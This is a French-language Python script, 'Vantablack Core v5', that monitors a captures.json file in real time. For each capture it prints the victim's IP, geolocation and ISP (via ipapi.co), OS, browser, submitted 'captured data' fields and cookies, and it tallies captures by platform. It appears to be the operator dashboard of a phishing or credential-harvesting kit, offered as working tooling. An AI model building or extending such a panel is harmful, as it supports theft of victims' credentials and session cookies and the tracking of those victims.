#!/usr/bin/env python3
"""
Vantablack Core v5 - Monitoring Temps Réel
Affichage des données capturées en temps réel avec détection OS et informations attaquant
"""

import json
import os
import time
from datetime import datetime
import platform
import subprocess
from pathlib import Path

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class RealTimeMonitor:
    def __init__(self):
        self.capture_file = "captures.json"
        self.last_size = 0
        self.last_captures = []
        
    def detect_os_browser(self, user_agent):
        """Détecte l'OS et le navigateur depuis le User-Agent"""
        if not user_agent:
            return "Inconnu", "Inconnu"
        
        ua = user_agent.lower()
        
        # Détection OS
        os_type = "Inconnu"
        if "windows" in ua:
            os_type = "Windows"
            if "nt 10.0" in ua or "windows 10" in ua:
                os_type = "Windows 10"
            elif "nt 6.3" in ua or "windows 8.1" in ua:
                os_type = "Windows 8.1"
            elif "nt 6.2" in ua or "windows 8" in ua:
                os_type = "Windows 8"
            elif "nt 6.1" in ua or "windows 7" in ua:
                os_type = "Windows 7"
        elif "mac" in ua or "os x" in ua:
            os_type = "macOS"
            if "iphone" in ua or "ipad" in ua:
                os_type = "iOS"
        elif "linux" in ua:
            os_type = "Linux"
            if "android" in ua:
                os_type = "Android"
        elif "android" in ua:
            os_type = "Android"
        elif "iphone" in ua or "ipad" in ua:
            os_type = "iOS"
        
        # Détection navigateur
        browser = "Inconnu"
        if "chrome" in ua and "edg" not in ua:
            browser = "Chrome"
        elif "firefox" in ua:
            browser = "Firefox"
        elif "safari" in ua and "chrome" not in ua:
            browser = "Safari"
        elif "edg" in ua:
            browser = "Edge"
        elif "opera" in ua:
            browser = "Opera"
        elif "samsung" in ua:
            browser = "Samsung Internet"
        
        return os_type, browser
    
    def get_ip_info(self, ip):
        """Récupère les informations de localisation pour une IP"""
        if ip in ["127.0.0.1", "localhost", "::1"]:
            return "Localhost", "Test"
        
        try:
            # Utilisation d'ipapi.co pour la géolocalisation
            import requests
            response = requests.get(f"http://ipapi.co/{ip}/json/", timeout=3)
            if response.status_code == 200:
                data = response.json()
                country = data.get('country_name', 'Inconnu')
                city = data.get('city', 'Inconnu')
                return f"{city}, {country}", data.get('org', 'Inconnu')
        except Exception as e:
            print(f"{Colors.YELLOW}⚠️ Erreur géolocalisation IP {ip}: {e}{Colors.RESET}")
            return "Localisation inconnue", "Fournisseur inconnu"
    
    def display_capture(self, capture):
        """Affiche une capture de manière détaillée"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}🎯 NOUVELLE CAPTURE DÉTECTÉE !{Colors.RESET}")
        print(f"{Colors.BOLD}══════════════════════════════════════════════════════{Colors.RESET}")
        
        # Informations de base
        timestamp = capture.get('timestamp', '')
        ip = capture.get('ip', 'Inconnu')
        user_agent = capture.get('user_agent', 'Inconnu')
        platform_name = capture.get('platform', 'Inconnu')
        
        print(f"{Colors.BOLD}🕒 Timestamp:{Colors.RESET} {timestamp}")
        print(f"{Colors.BOLD}🌐 IP:{Colors.RESET} {ip}")
        
        # Détection OS et navigateur
        os_type, browser = self.detect_os_browser(user_agent)
        print(f"{Colors.BOLD}💻 OS:{Colors.RESET} {os_type}")
        print(f"{Colors.BOLD}🔍 Navigateur:{Colors.RESET} {browser}")
        
        # Informations de localisation
        location, isp = self.get_ip_info(ip)
        print(f"{Colors.BOLD}📍 Localisation:{Colors.RESET} {location}")
        print(f"{Colors.BOLD}🏢 ISP:{Colors.RESET} {isp}")
        
        # Données capturées
        data = capture.get('data', {})
        if data:
            print(f"{Colors.BOLD}📋 DONNÉES CAPTURÉES:{Colors.RESET}")
            for key, value in data.items():
                if value:  # Ne pas afficher les champs vides
                    print(f"  {Colors.GREEN}✓ {key}:{Colors.RESET} {value}")
        
        # Cookies et tokens si disponibles
        if 'cookies' in data:
            print(f"{Colors.BOLD}🍪 COOKIES:{Colors.RESET}")
            for cookie in data['cookies']:
                print(f"  {Colors.YELLOW}⟶ {cookie}{Colors.RESET}")
        
        print(f"{Colors.BOLD}══════════════════════════════════════════════════════{Colors.RESET}")
    
    def monitor_captures(self):
        """Surveille le fichier de captures en temps réel"""
        print(f"{Colors.BOLD}{Colors.MAGENTA}👁️  MONITORING TEMPS RÉEL VANTABLACK v5{Colors.RESET}")
        print(f"{Colors.YELLOW}Surveillance active des captures...{Colors.RESET}")
        print(f"{Colors.BOLD}Appuyez sur Ctrl+C pour arrêter{Colors.RESET}")
        
        try:
            while True:
                if os.path.exists(self.capture_file):
                    current_size = os.path.getsize(self.capture_file)
                    
                    if current_size > self.last_size:
                        # Nouvelle capture détectée
                        with open(self.capture_file, 'r') as f:
                            try:
                                captures = json.load(f)
                                if len(captures) > len(self.last_captures):
                                    # Afficher les nouvelles captures
                                    new_captures = captures[len(self.last_captures):]
                                    for capture in new_captures:
                                        self.display_capture(capture)
                                    self.last_captures = captures
                            except json.JSONDecodeError:
                                pass
                        
                        self.last_size = current_size
                
                time.sleep(1)  # Vérifier toutes les secondes
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}⏹️  Monitoring arrêté{Colors.RESET}")
    
    def show_stats(self):
        """Affiche les statistiques des captures"""
        if not os.path.exists(self.capture_file):
            print(f"{Colors.RED}❌ Aucune capture trouvée{Colors.RESET}")
            return
        
        try:
            with open(self.capture_file, 'r') as f:
                captures = json.load(f)
            
            print(f"{Colors.BOLD}{Colors.GREEN}📊 STATISTIQUES DES CAPTURES{Colors.RESET}")
            print(f"{Colors.BOLD}══════════════════════════════════════════════════════{Colors.RESET}")
            print(f"{Colors.BOLD}🎯 Total captures:{Colors.RESET} {len(captures)}")
            
            # Statistiques par plateforme
            platforms = {}
            os_stats = {}
            browser_stats = {}
            
            for capture in captures:
                platform_name = capture.get('platform', 'Inconnu')
                platforms[platform_name] = platforms.get(platform_name, 0) + 1
                
                # Stats OS et navigateur
                os_type, browser = self.detect_os_browser(capture.get('user_agent'))
                os_stats[os_type] = os_stats.get(os_type, 0) + 1
                browser_stats[browser] = browser_stats.get(browser, 0) + 1
            
            print(f"\n{Colors.BOLD}📱 Plateformes:{Colors.RESET}")
            for platform, count in platforms.items():
                print(f"  {Colors.CYAN}⟶ {platform}:{Colors.RESET} {count}")
            
            print(f"\n{Colors.BOLD}💻 Systèmes d'exploitation:{Colors.RESET}")
            for os_type, count in os_stats.items():
                print(f"  {Colors.BLUE}⟶ {os_type}:{Colors.RESET} {count}")
            
            print(f"\n{Colors.BOLD}🔍 Navigateurs:{Colors.RESET}")
            for browser, count in browser_stats.items():
                print(f"  {Colors.MAGENTA}⟶ {browser}:{Colors.RESET} {count}")
            
            print(f"{Colors.BOLD}══════════════════════════════════════════════════════{Colors.RESET}")
            
        except json.JSONDecodeError:
            print(f"{Colors.RED}❌ Erreur de lecture du fichier de captures{Colors.RESET}")

def main():
    """Point d'entrée principal"""
    monitor = RealTimeMonitor()
    
    print(f"{Colors.BOLD}{Colors.MAGENTA}📡 MONITORING VANTABLACK CORE v5{Colors.RESET}")
    print(f"{Colors.YELLOW}Système de surveillance temps réel des captures{Colors.RESET}")
    
    # Options
    print(f"\n{Colors.BOLD}Options:{Colors.RESET}")
    print(f"{Colors.GREEN}1.{Colors.RESET} Surveillance temps réel")
    print(f"{Colors.GREEN}2.{Colors.RESET} Afficher les statistiques")
    print(f"{Colors.GREEN}3.{Colors.RESET} Voir les captures récentes")
    
    choice = input(f"{Colors.YELLOW}➤ Choix: {Colors.RESET}").strip()
    
    if choice == "1":
        monitor.monitor_captures()
    elif choice == "2":
        monitor.show_stats()
    elif choice == "3":
        monitor.show_stats()
        if input(f"{Colors.YELLOW}➤ Lancer la surveillance? (o/n): {Colors.RESET}").lower() == 'o':
            monitor.monitor_captures()
    else:
        print(f"{Colors.RED}❌ Choix invalide{Colors.RESET}")

if __name__ == "__main__":
    main()